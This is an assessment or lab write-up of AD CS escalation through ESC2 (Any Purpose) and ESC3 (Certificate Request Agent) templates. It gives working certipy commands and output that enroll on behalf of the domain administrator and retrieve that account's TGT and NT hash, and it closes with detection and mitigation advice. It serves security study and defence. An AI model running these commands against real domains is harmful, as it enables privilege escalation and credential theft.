# ESC2 and ESC3: Any Purpose and Enrolmment Agent Certificates

## Objective

This part of assessment examined templates that allowed a normal user to obtain certificates with overly broad purposes or certificate-request-agent capability.

## ESC2: Any Purpose certificate

The `ESC2` template was available to Domain Users and included the `Any Purpose` extended key usage.

A certificate was required with the low-privileged account:

```bash
certipy req -u khal.drogo@essos.local -p 'horse' -target 10.4.10.23 -template ESC2 -ca ESSOS-CA

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 5
[*] Got certificate with UPN 'khal.drogo@essos.local'
[*] Certificate object SID is 'S-1-5-21-1626587276-1544673639-3547638884-1114'
[*] Saved certificate and private key to 'khal.drogo.pfx'
```

The resulting certificate then was used to request a certificate on behalf of a privileged identity through a suitable target template:

```bash
certipy req -u khal.drogo@essos.local -p 'horse' -target 10.4.10.23 -template User -ca ESSOS-CA -on-behalf-of 'essos\administrator' -pfx khal.drogo.pfx

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 6
[*] Got certificate with UPN 'administrator@essos.local'
[*] Certificate object SID is 'S-1-5-21-1626587276-1544673639-3547638884-500'
[*] Saved certificate and private key to 'administrator.pfx'
```

The issued Administrator certificate was used succesfully for authentication.

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.4.10.12

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@essos.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@essos.local': aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da
```

## ESC3: Certificate Request Agent

Enumeration also identified `ESC3-CRA`, a template with the Certificate Request Agent EKU that Domain Users could enrol in.

That condition can allow a requester to obtain a certificatae and use it to enrol on behalf of another identity when a compatible target template accepts agent signatures.

## Result

The assessment confirmed a complete ESC2 and ESC3-based escalation to a privileged certificate.

## Security impact

Any Purpose and Enrollment Agent certificates delegate excessive trust to the holder. A low-privileged user may be able to request certificates for other identities, bypassing normal password and MFA expectations tied to the original account.

## Detection opportunities

- Low-privileged users enrolling in Any Purpose or Certificate Request Agent templates
- Requests made `on behalf of` another identity
- Agent certificates used shortly after issuance
- Privileged PKINIT authentication from a system normally associated with a standard user

## Mitigation

- Remove Any Purpose EKUs from general-user templates
- Restrict Cerrtificate Request Agent templates to dedicated and tightly controlled enrolment agents
- Require authorised signatures and constrain which templates accept agent requests
- Audit existing issued agent certificates and revoke those that are not operationally required

## Navigation

[Previous: ESC1](02-esc1.md) | [AD CS index](README.md) | [Next: ESC4](04-esc4.md)